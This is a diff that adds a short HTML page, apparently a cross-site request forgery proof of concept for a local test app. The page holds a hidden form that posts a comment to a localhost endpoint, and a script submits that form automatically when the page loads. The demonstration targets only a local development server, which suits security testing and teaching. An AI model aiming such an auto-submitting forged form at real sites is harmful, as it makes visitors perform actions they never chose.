@@ -1,0 +1,11 @@
+<html>
+  <body>
+    <form action="http://127.0.0.1:5000/create_comment" method="POST">
+      <input type="hidden" name="comment" value="CSRF attack comment!">
+      <input type="submit" value="Submit comment">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
